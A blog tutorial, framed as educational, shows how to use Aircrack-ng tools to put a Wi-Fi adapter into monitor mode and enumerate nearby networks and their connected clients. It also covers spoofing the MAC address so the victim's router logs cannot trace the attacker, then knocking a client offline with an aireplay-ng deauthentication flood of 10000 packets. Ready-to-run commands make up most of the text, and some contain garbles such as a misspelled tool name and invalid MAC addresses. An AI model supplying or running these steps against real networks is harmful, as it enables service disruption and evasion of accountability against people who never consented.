Sniffing Wi-Fi with Aircrack-ng. Attacking Wi-fi Using Deauthentication.

Warning:-

This blog is Created for the educational use only to show wireless penetration testing.Using this information for malicious activity can send you behind the jails.Use your own router for the Demonstration

What do we learn in this tutorial:-

  • Modes of USB Wi-Fi Adapter
  • How to hide your identity before penetrating Wi-Fi
  • Able to see Wi-fi networks
  • Able to see Connected Clients with corresponding Wi-Fi network
  • Deauthentication attack

Requirements:-

  • VMware(Installtion of VMware)
  • Kali Linux (Installtion of Kali in VMware)
  • USB Wi-Fi adapter which has Monitor mode

1) Modes of USB Wi-Fi adaptor

  • USB Wi-Fi has 2 Modes: 1) Managed mode 2) Monitor mode
    • Generally, All USB Wi-Fi adapter comes with managed mode by default.
    • To see network traffics, other Access points, ESSID, BSSID, Channel numbers, Packets,
    • Monitor mode in kali especially used for wireless pen testing.

We have to run following command to ensure wireless USB Wi-Fi adaptor is connected or not.

# iwconfig

Run following Command to put Adaptor into monitor mode and Check (It must change wlan0 to wlan0mon).

 #  airmon-ng start wlan0
 #  iwconfig

2) How to hide your identity before hack/penetrate Wi-Fi

  • Hiding is always a good idea.If you will do attack a particular Wi-Fi with your real MAC address then you could be Traced by that victim.
  • Because you could be check by the router logs. Your MAC addressed will be there.
  • To evade yourself you need change you MAC addressed

We have to put an adaptor into managed mode. So enter the following command and check if it goes in managed mode.

# airmon-ng  stop  wlan0mon
# iwconfig

To check real MAC address:-

# ifconfig wlan0

To change Random MAC address:-

# macchanger -r wlan0mon

3) How to see Wi-fi networks

  • Ensure that the adapter is in Monitor mode.
  • Enter the following command to see all Wi-Fi networks.
# aerodump-ng wlan0mon

  • You can see Information about Wi-Fi networks like BSSID, PWR, Beacons, Channel, Ecryption, Authentication , ESSID.
  • You Need this information in future to penetrate Wi-Fi.

4 )How to see Connected Clients with corresponding Wi-Fi network

  • To see how many Clients connected to a particular Wi-Fi router. You Must have the BSSID and channel number of that router that you already had.

  • Enter the following command

    # airodump-ng --bssid <BSSID of Router>  --channel <Channel No>  wlan0mon

    Example:- If you have BSSID of router A0:B1:C2:D3:E4: F5 and Channel number 5 then the command will be

    airodump-ng --bssid A0:B1:C2:D3:E4:F5  --channel 5  wlan0mon

If you did correctly you will see window same as I show above.

5 ) Deauthentication attack

  • To perform this attack you must have routers BSSID and connected Client MAC address. Which you get from step 4 -Enter the following command to attack
aireplay-ng --deauth <No of packets> -a <BSSID of Router> -c <Client MAC address>  wlan0mon

Example:- If you have BSSID of router A0:B1:C2:D3:E4:F5 , client MAC address U0:V1:W2:X3:Y4: Z5 and Number of packets 10000 them command will be

aireplay-ng --deauth 10000 -a A0:B1:C2:D3:E4: F5 -c U0:V1:W2:X3:Y4: Z5  wlan0mon

Then Check Client will continue Disconnect from router until 10000 packets are sent from the adapter.
